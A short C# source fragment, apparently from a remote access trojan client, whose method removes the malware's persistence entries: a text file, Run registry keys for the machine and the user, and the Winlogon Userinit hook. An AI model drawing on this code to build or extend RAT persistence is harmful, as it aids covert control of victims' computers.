namespace RatClient.Persistence
{
	class UnregisterTools
	{
		public static void UnregregAll()
		{
			Registrys.PersistTxtfile(unreg: true);
			Registrys.RunLocalMachine("unreg", unreg: true);
			Registrys.RunLogonUser("unreg", unreg: true);
			Registrys.WinLogonUserInit(unreg: true);
		}
	}
}
